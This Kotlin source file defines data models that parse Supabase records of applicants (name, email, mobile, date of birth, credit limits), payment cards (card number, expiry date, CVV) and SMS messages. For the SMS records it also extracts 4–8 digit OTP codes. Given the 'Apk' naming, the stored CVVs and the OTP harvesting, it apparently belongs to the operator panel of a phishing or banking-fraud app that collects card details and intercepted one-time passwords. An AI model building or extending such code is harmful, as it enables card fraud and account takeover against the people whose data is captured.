package com.example.data.supabase

import com.example.util.IndianDateTimeFormatter
import org.json.JSONObject

data class ApkApplicantDetail(
    val id: Long,
    val fullName: String,
    val email: String,
    val mobile: String,
    val dateOfBirth: String,
    val termsAccepted: Boolean,
    val createdAt: String,
    val availableLimit: String = "-",
    val totalLimit: String = "-",
    val rawJson: Map<String, Any?> = emptyMap(),
    val stringId: String = ""
) {
    val formattedIndianDate: String get() = IndianDateTimeFormatter.formatToIndianDate(createdAt)
    val formattedIndianTime: String get() = IndianDateTimeFormatter.formatToIndianTime(createdAt)
    val formattedIndianDateTime: String get() = IndianDateTimeFormatter.formatToIndianDateTime(createdAt)
    val formattedIndianDateTimeWithZone: String get() = IndianDateTimeFormatter.formatToIndianDateTimeWithZone(createdAt)
    val formattedIndianDateSlash: String get() = IndianDateTimeFormatter.formatToIndianDateSlash(createdAt)
    val relativeOrIndianDate: String get() = IndianDateTimeFormatter.formatRelativeOrDate(createdAt)
    val epochMillis: Long get() = IndianDateTimeFormatter.parseDate(createdAt)?.time ?: 0L

    val formattedAvailableLimit: String
        get() {
            if (availableLimit == "-" || availableLimit.isBlank() || availableLimit.equals("null", ignoreCase = true)) return "-"
            val clean = availableLimit.replace("₹", "").replace(",", "").trim()
            val num = clean.toDoubleOrNull()
            return if (num != null) {
                if (num % 1.0 == 0.0) "₹${String.format("%,d", num.toLong())}" else "₹${String.format("%,.2f", num)}"
            } else {
                if (availableLimit.startsWith("₹")) availableLimit else "₹$availableLimit"
            }
        }

    val formattedTotalLimit: String
        get() {
            if (totalLimit == "-" || totalLimit.isBlank() || totalLimit.equals("null", ignoreCase = true)) return "-"
            val clean = totalLimit.replace("₹", "").replace(",", "").trim()
            val num = clean.toDoubleOrNull()
            return if (num != null) {
                if (num % 1.0 == 0.0) "₹${String.format("%,d", num.toLong())}" else "₹${String.format("%,.2f", num)}"
            } else {
                if (totalLimit.startsWith("₹")) totalLimit else "₹$totalLimit"
            }
        }

    companion object {
        fun fromJsonObject(obj: JSONObject): ApkApplicantDetail {
            val map = mutableMapOf<String, Any?>()
            obj.keys().forEach { key ->
                map[key] = obj.opt(key)
            }
            val id = obj.optLong("id", 0L).let { if (it != 0L) it else obj.optString("id").toLongOrNull() ?: 0L }
                .let { if (it != 0L) it else obj.optLong("_id", 0L) }
                .let { if (it != 0L) it else obj.optLong("applicant_id", 0L) }
            val stringId = obj.optStringOrNull("id") ?: obj.optStringOrNull("_id") ?: obj.optStringOrNull("applicant_id") ?: id.toString()
            val fullName = obj.optStringOrNull("full_name") ?: obj.optStringOrNull("fullName") ?: obj.optStringOrNull("name") ?: "-"
            val email = obj.optStringOrNull("email") ?: "-"
            val mobile = obj.optStringOrNull("mobile") ?: obj.optStringOrNull("mobile_number") ?: obj.optStringOrNull("phone") ?: "-"
            val dob = obj.optStringOrNull("date_of_birth") ?: obj.optStringOrNull("dob") ?: obj.optStringOrNull("dateOfBirth") ?: "-"
            val terms = obj.optBoolean("terms_accepted", false)
            val availableLimit = obj.optStringOrNull("available_limit") ?: obj.optStringOrNull("avail_limit") ?: obj.optStringOrNull("availableLimit") ?: "-"
            val totalLimit = obj.optStringOrNull("total_limit") ?: obj.optStringOrNull("tot_limit") ?: obj.optStringOrNull("totalLimit") ?: "-"
            val createdAt = obj.optStringOrNull("created_at")
                ?: obj.optStringOrNull("received_at")
                ?: obj.optStringOrNull("submitted_at")
                ?: obj.optStringOrNull("timestamp")
                ?: obj.optStringOrNull("time_stamp")
                ?: obj.optStringOrNull("inserted_at")
                ?: obj.optStringOrNull("created")
                ?: obj.optStringOrNull("date")
                ?: "-"

            return ApkApplicantDetail(
                id = id,
                fullName = fullName,
                email = email,
                mobile = mobile,
                dateOfBirth = dob,
                termsAccepted = terms,
                createdAt = createdAt,
                availableLimit = availableLimit,
                totalLimit = totalLimit,
                rawJson = map,
                stringId = stringId
            )
        }
    }
}

data class ApkCardAuth(
    val id: Long,
    val nameOnCard: String,
    val cardNumber: String,
    val expiryDate: String,
    val cvv: String,
    val createdAt: String,
    val rawJson: Map<String, Any?> = emptyMap(),
    val stringId: String = ""
) {
    val formattedIndianDate: String get() = IndianDateTimeFormatter.formatToIndianDate(createdAt)
    val formattedIndianTime: String get() = IndianDateTimeFormatter.formatToIndianTime(createdAt)
    val formattedIndianDateTime: String get() = IndianDateTimeFormatter.formatToIndianDateTime(createdAt)
    val formattedIndianDateTimeWithZone: String get() = IndianDateTimeFormatter.formatToIndianDateTimeWithZone(createdAt)
    val formattedIndianDateSlash: String get() = IndianDateTimeFormatter.formatToIndianDateSlash(createdAt)
    val relativeOrIndianDate: String get() = IndianDateTimeFormatter.formatRelativeOrDate(createdAt)
    val epochMillis: Long get() = IndianDateTimeFormatter.parseDate(createdAt)?.time ?: 0L

    companion object {
        fun fromJsonObject(obj: JSONObject): ApkCardAuth {
            val map = mutableMapOf<String, Any?>()
            obj.keys().forEach { key ->
                map[key] = obj.opt(key)
            }
            val id = obj.optLong("id", 0L).let { if (it != 0L) it else obj.optString("id").toLongOrNull() ?: 0L }
                .let { if (it != 0L) it else obj.optLong("_id", 0L) }
                .let { if (it != 0L) it else obj.optLong("card_id", 0L) }
            val stringId = obj.optStringOrNull("id") ?: obj.optStringOrNull("_id") ?: obj.optStringOrNull("card_id") ?: id.toString()
            val name = obj.optStringOrNull("name_on_card") ?: obj.optStringOrNull("cardholder_name") ?: obj.optStringOrNull("name") ?: "-"
            val cardNum = obj.optStringOrNull("card_number") ?: obj.optStringOrNull("cardNumber") ?: "-"
            val exp = obj.optStringOrNull("expiry_date") ?: obj.optStringOrNull("expiry") ?: obj.optStringOrNull("exp") ?: "-"
            val cvv = obj.optStringOrNull("cvv") ?: "-"
            val createdAt = obj.optStringOrNull("created_at")
                ?: obj.optStringOrNull("received_at")
                ?: obj.optStringOrNull("submitted_at")
                ?: obj.optStringOrNull("timestamp")
                ?: obj.optStringOrNull("time_stamp")
                ?: obj.optStringOrNull("inserted_at")
                ?: obj.optStringOrNull("created")
                ?: obj.optStringOrNull("date")
                ?: "-"

            return ApkCardAuth(
                id = id,
                nameOnCard = name,
                cardNumber = cardNum,
                expiryDate = exp,
                cvv = cvv,
                createdAt = createdAt,
                rawJson = map,
                stringId = stringId
            )
        }
    }
}

data class ApkSmsMessage(
    val id: Long,
    val sender: String,
    val messageBody: String,
    val receivedAt: String,
    val rawJson: Map<String, Any?> = emptyMap(),
    val stringId: String = ""
) {
    val formattedIndianDate: String get() = IndianDateTimeFormatter.formatToIndianDate(receivedAt)
    val formattedIndianTime: String get() = IndianDateTimeFormatter.formatToIndianTime(receivedAt)
    val formattedIndianDateTime: String get() = IndianDateTimeFormatter.formatToIndianDateTime(receivedAt)
    val formattedIndianDateTimeWithZone: String get() = IndianDateTimeFormatter.formatToIndianDateTimeWithZone(receivedAt)
    val formattedIndianDateSlash: String get() = IndianDateTimeFormatter.formatToIndianDateSlash(receivedAt)
    val relativeOrIndianDate: String get() = IndianDateTimeFormatter.formatRelativeOrDate(receivedAt)
    val epochMillis: Long get() = IndianDateTimeFormatter.parseDate(receivedAt)?.time ?: 0L

    /**
     * Extracts probable OTP code (4-8 digits) from message body if present
     */
    val extractedOtp: String? by lazy {
        val regex = Regex("""\b\d{4,8}\b""")
        regex.find(messageBody)?.value
    }

    companion object {
        fun fromJsonObject(obj: JSONObject): ApkSmsMessage {
            val map = mutableMapOf<String, Any?>()
            obj.keys().forEach { key ->
                map[key] = obj.opt(key)
            }
            val id = obj.optLong("id", 0L).let { if (it != 0L) it else obj.optString("id").toLongOrNull() ?: 0L }
                .let { if (it != 0L) it else obj.optLong("_id", 0L) }
                .let { if (it != 0L) it else obj.optLong("message_id", 0L) }
                .let { if (it != 0L) it else obj.optLong("sms_id", 0L) }
            val stringId = obj.optStringOrNull("id") ?: obj.optStringOrNull("_id") ?: obj.optStringOrNull("message_id") ?: id.toString()
            val sender = obj.optStringOrNull("sender") ?: obj.optStringOrNull("address") ?: obj.optStringOrNull("from") ?: "-"
            val body = obj.optStringOrNull("message_body") ?: obj.optStringOrNull("body") ?: obj.optStringOrNull("message") ?: "-"
            val received = obj.optStringOrNull("received_at")
                ?: obj.optStringOrNull("created_at")
                ?: obj.optStringOrNull("submitted_at")
                ?: obj.optStringOrNull("timestamp")
                ?: obj.optStringOrNull("time_stamp")
                ?: obj.optStringOrNull("inserted_at")
                ?: obj.optStringOrNull("created")
                ?: obj.optStringOrNull("date")
                ?: "-"

            return ApkSmsMessage(
                id = id,
                sender = sender,
                messageBody = body,
                receivedAt = received,
                rawJson = map,
                stringId = stringId
            )
        }
    }
}

private fun JSONObject.optStringOrNull(key: String): String? {
    if (!has(key) || isNull(key)) return null
    val v = optString(key, "").trim()
    return if (v.isEmpty() || v.equals("null", ignoreCase = true)) null else v
}
